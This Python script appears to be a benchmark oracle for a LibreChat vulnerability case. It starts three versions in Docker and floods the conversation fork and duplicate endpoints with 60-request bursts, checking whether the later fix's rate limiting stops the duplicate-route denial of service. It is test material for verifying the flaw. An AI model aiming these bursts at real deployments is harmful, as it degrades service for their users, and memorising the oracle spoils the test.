#!/usr/bin/env python3
"""Flag differential oracle for librechat-cve-2026-54037.

Chain: CVE-2025-7105 (unrestricted /api/convos/fork DoS, fixed 0.7.9 by commit
       97a99985 with forkIpLimiter/forkUserLimiter on the /fork route ONLY)
     -> CVE-2026-54037 (the sibling clone route /api/convos/duplicate performs
        the same expensive conversation-clone work but was MISSED by the fix;
        fixed 0.8.4-rc1 by adding the same fork limiters to /duplicate).

V0 = LibreChat v0.7.8  (no fork/duplicate rate limiting at all)
V1 = LibreChat v0.7.9  (/fork throttled; /duplicate UNTHROTTLED)   <- target
V2 = LibreChat v0.8.4-rc1 (/duplicate throttled with the same limiters)

DoS-threshold gate (Variant C), no flag token needed:
  seed:    60x POST /api/convos/fork
           -> V0: 0x HTTP 429 (open),  V1: >=1x HTTP 429 (throttled)
  residual: 60x POST /api/convos/duplicate
           -> V1: 0x HTTP 429 (open),  V2: >=1x HTTP 429 (throttled)

FORK_USER_MAX=3 / FORK_IP_MAX=10 are set via env on V1/V2 so the gate is fast.
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import time
from pathlib import Path

import requests

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import librechat_util as u  # noqa: E402

CASE = "librechat-cve-2026-54037"
FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
BURST = 60


def _burst(base: str, path: str) -> dict:
    lr = u.ensure_user(base)
    if "token" not in lr:
        return {"n429": -1, "first_status": 0, "body": lr.get("error", "login failed")}
    h = {"Authorization": f"Bearer {lr['token']}"}
    n429 = 0
    first = 0
    statuses = {}
    for _ in range(BURST):
        try:
            r = requests.post(base + path, headers=h, json={}, timeout=30)
        except Exception as e:
            return {"n429": -1, "first_status": first, "body": f"exception: {e}"}
        if first == 0:
            first = r.status_code
        statuses[r.status_code] = statuses.get(r.status_code, 0) + 1
        if r.status_code == 429:
            n429 += 1
        time.sleep(0.05)
    return {"n429": n429, "first_status": first, "statuses": statuses}


def seed_exploit(*, version="v0") -> dict:
    if not u.wait_ready(u.BASE[CASE][version]):
        return {"ok": False, "detail": "env not ready"}
    r = _burst(u.BASE[CASE][version], "/api/convos/fork")
    r["ok"] = r["n429"] == 0
    return r


def residual_exploit(*, version="v1") -> dict:
    if not u.wait_ready(u.BASE[CASE][version]):
        return {"ok": False, "detail": "env not ready"}
    r = _burst(u.BASE[CASE][version], "/api/convos/duplicate")
    r["ok"] = r["n429"] == 0
    return r


def gate() -> dict:
    s0 = seed_exploit(version="v0")
    s1 = seed_exploit(version="v1")
    r1 = residual_exploit(version="v1")
    r2 = residual_exploit(version="v2")
    return {
        "seed_open_on_v0": s0["ok"],
        "seed_closed_on_v1": not s1["ok"],
        "residual_reaches_flag_on_v1": r1["ok"],
        "residual_blocked_on_v2": not r2["ok"],
        "seed_v0": {k: s0[k] for k in ("n429", "first_status", "statuses")},
        "seed_v1": {k: s1[k] for k in ("n429", "first_status", "statuses")},
        "residual_v1": {k: r1[k] for k in ("n429", "first_status", "statuses")},
        "residual_v2": {k: r2[k] for k in ("n429", "first_status", "statuses")},
        "passed": all([s0["ok"], not s1["ok"], r1["ok"], not r2["ok"]]),
    }


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
    env = {"PCB_FLAG": FLAG}
    all_profiles = ["--profile", "v0", "--profile", "v1", "--profile", "v2"]
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2500:]}
    result = gate()
    result["_env_ready"] = {
        v: u.wait_ready(u.BASE[CASE][v], timeout=60) for v in profiles
    }
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
